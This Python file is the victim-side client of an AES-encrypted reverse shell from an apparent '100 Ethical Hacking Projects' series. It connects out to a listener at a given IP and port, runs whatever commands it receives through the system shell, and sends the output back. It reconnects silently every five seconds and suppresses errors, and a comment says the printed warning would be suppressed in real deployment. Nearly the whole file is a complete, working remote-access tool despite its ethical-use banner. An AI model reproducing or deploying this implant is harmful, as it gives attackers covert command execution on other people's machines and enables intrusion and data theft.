 #!/usr/bin/env python3
"""
============================================================
  PROJECT #5 — Reverse Shell  |  CLIENT (Victim Side)
  100 Ethical Hacking Projects Series
  Crypto  : AES-256-CBC  (PBKDF2 key from passphrase)
  Reconnect: every 5 seconds on connection loss
============================================================

  ╔══════════════════════════════════════════════════════╗
  ║          ⚠  ETHICAL USE WARNING  ⚠                  ║
  ║  Deploy ONLY on machines you own or have explicit    ║
  ║  written authorisation to test.                      ║
  ╚══════════════════════════════════════════════════════╝

USAGE
------
  python3 project5_client.py --ip 127.0.0.1 --port 4444
  python3 project5_client.py --ip 192.168.1.10 --port 4444 --passphrase mysecret
============================================================
"""

import socket
import subprocess
import os
import sys
import time
import struct
import hashlib
import argparse
import platform

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding as sym_padding

# ── crypto (identical to listener) ───────────────────────
SALT        = b"project5salt99"
ITERATIONS  = 100_000
KEY_LEN     = 32
IV_LEN      = 16

def derive_key(passphrase: str) -> bytes:
    return hashlib.pbkdf2_hmac(
        "sha256", passphrase.encode(), SALT, ITERATIONS, dklen=KEY_LEN)

def aes_encrypt(plaintext: bytes, key: bytes) -> bytes:
    iv     = os.urandom(IV_LEN)
    padder = sym_padding.PKCS7(128).padder()
    padded = padder.update(plaintext) + padder.finalize()
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    enc    = cipher.encryptor()
    ct     = enc.update(padded) + enc.finalize()
    return iv + ct

def aes_decrypt(ciphertext: bytes, key: bytes) -> bytes:
    iv       = ciphertext[:IV_LEN]
    ct       = ciphertext[IV_LEN:]
    cipher   = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    dec      = cipher.decryptor()
    padded   = dec.update(ct) + dec.finalize()
    unpadder = sym_padding.PKCS7(128).unpadder()
    return unpadder.update(padded) + unpadder.finalize()

# ── framing ───────────────────────────────────────────────
def send_msg(sock, data: bytes):
    sock.sendall(struct.pack(">I", len(data)) + data)

def recv_msg(sock) -> bytes:
    raw_len = _recv_exact(sock, 4)
    if not raw_len:
        return b""
    length = struct.unpack(">I", raw_len)[0]
    return _recv_exact(sock, length)

def _recv_exact(sock, n: int) -> bytes:
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            return b""
        buf += chunk
    return buf

# ── shell execution ───────────────────────────────────────
IS_WINDOWS = platform.system() == "Windows"

def run_command(cmd: str, cwd: str) -> tuple[str, str]:
    """
    Execute a shell command in `cwd`.
    Returns (new_cwd, output_string).
    Handles `cd` natively so directory state persists.
    """
    cmd = cmd.strip()

    # ── cd handling ──────────────────────────────────────
    if cmd.lower() == "cd" or cmd.lower().startswith("cd "):
        parts = cmd.split(None, 1)
        if len(parts) == 1:
            # bare `cd` → go home
            target = os.path.expanduser("~")
        else:
            target = os.path.expandvars(os.path.expanduser(parts[1]))
            if not os.path.isabs(target):
                target = os.path.join(cwd, target)
        target = os.path.normpath(target)
        if os.path.isdir(target):
            return target, f"[cd] → {target}\n"
        else:
            return cwd, f"cd: no such directory: {target}\n"

    # ── normal command ───────────────────────────────────
    shell = True   # use shell so pipes, redirection, builtins work
    try:
        result = subprocess.run(
            cmd,
            shell=shell,
            cwd=cwd,
            capture_output=True,
            timeout=30,
            text=True,
            errors="replace",
        )
        output = result.stdout
        if result.stderr:
            output += result.stderr
        if not output:
            output = "[command executed — no output]\n"
    except subprocess.TimeoutExpired:
        output = "[!] Command timed out (30s limit)\n"
    except Exception as e:
        output = f"[!] Execution error: {e}\n"

    return cwd, output

# ── main client loop ──────────────────────────────────────
def run_client(server_ip: str, server_port: int, passphrase: str):
    key = derive_key(passphrase)
    cwd = os.getcwd()

    RECONNECT_DELAY = 5   # seconds between reconnect attempts
    attempt = 0

    while True:
        attempt += 1
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((server_ip, server_port))
            sock.settimeout(None)   # blocking after connect

            attempt = 0   # reset on success

            # send initial cwd as first message
            send_msg(sock, aes_encrypt(cwd.encode(), key))

            # command loop
            while True:
                raw = recv_msg(sock)
                if not raw:
                    break   # connection dropped

                cmd = aes_decrypt(raw, key).decode(errors="replace").strip()

                if cmd.lower() == "exit":
                    sock.close()
                    sys.exit(0)

                cwd, output = run_command(cmd, cwd)

                # response = new_cwd + "\n" + output
                response = (cwd + "\n" + output).encode()
                send_msg(sock, aes_encrypt(response, key))

        except (ConnectionRefusedError, OSError, TimeoutError):
            pass   # listener not up yet — retry silently
        except Exception:
            pass

        finally:
            try:
                sock.close()
            except Exception:
                pass

        time.sleep(RECONNECT_DELAY)


def main():
    parser = argparse.ArgumentParser(description="Project #5 — Reverse Shell Client")
    parser.add_argument("--ip",         required=True,             help="Listener IP address")
    parser.add_argument("--port",       type=int, default=4444,    help="Listener port (default: 4444)")
    parser.add_argument("--passphrase", default="ultraprohacker",  help="AES passphrase (must match listener)")
    args = parser.parse_args()

    # ethical warning (printed once; in a real deployment this would be suppressed)
    print()
    print("  ⚠  Project #5 — Reverse Shell Client (Educational)")
    print(f"  Connecting to {args.ip}:{args.port} every {5}s until successful …")
    print("  Authorised lab use only.\n")

    run_client(args.ip, args.port, args.passphrase)

if __name__ == "__main__":
    main()